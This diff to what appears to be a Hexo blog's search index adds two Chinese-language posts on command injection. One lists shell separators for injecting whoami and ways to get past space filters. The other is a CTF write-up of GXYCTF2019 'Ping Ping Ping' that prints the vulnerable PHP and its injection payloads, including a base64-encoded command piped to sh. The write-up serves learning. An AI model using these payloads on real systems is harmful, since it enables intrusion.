@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>命令执行漏洞</title>
+      <link href="/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p>Windows系例支持的管道符如下所示。</p><ul><li>“|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。</li><li>“||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。</li><li> “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</li></ul><p>Linux系统支持的管道符如下所示。</p><ul><li>“;”：执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami。</li><li>“|”：显示后面语句的执行结果。例如：ping 127.0.0.1|whoami。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。例如：ping 1||whoami。</li><li>“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</li></ul><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;可替代空格<br>$&#123;IFS&#125;可替代空格<br>$IFS$<span class="hljs-number">1</span>可替代空格<br>%09(url传递可替代空格)<br></code></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>命令执行题目</title>
+      <link href="/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/"/>
+      <url>/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</url>
+      
+        <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ping 127.0.0.1  正常<br><img src="/picture/zhixing1.png"></p><p><code>?ip=127.0.0.1|ls</code><br><img src="/picture/zhixing2.png"></p><p><code>?ip=127.0.0.1|cat flag.php</code><br><img src="/picture/zhixing3.png"><br>过滤了空格</p><p><code>?ip=127.0.0.1|cat$&#123;IFS&#125;flag.php</code><br><img src="/picture/zhixing4.png"><br>没绕过，可能过滤了{ 或者$</p><p><code>?ip=127.0.0.1|cat$IFS$1flag.php</code><br><img src="/picture/zhixing5.png"><br>绕过了，但是应该过滤了flag</p><p>?ip=127.0.0.1|cat$IFS$1fla?.php<br>还是不行，问好应该也被过滤了</p><p>那先看下index.php吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/?ip=<br>|\<span class="hljs-string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-string">    die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your space!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your bash!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your flag!&quot;);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-string">  echo &quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;;</span><br><span class="hljs-string">  print_r($a);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到了过滤字符的代码<br>正则也绕过不过去了，看了下别人的wp，学了个新姿势，base64加密绕过</p><p><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><br>Y2F0IGZsYWcucGhw是cat flag.php的base64-encode<br><img src="/picture/zhixing6.png"></p><p>看看这个新姿势</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>`<span class="hljs-keyword">ls</span>`<br>`<span class="hljs-keyword">ls</span>` 相当于system(<span class="hljs-keyword">ls</span>);<br>然后<span class="hljs-keyword">cat</span>显示内容<br></code></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>流密码</title>
       <link href="/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
       <url>/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/</url>
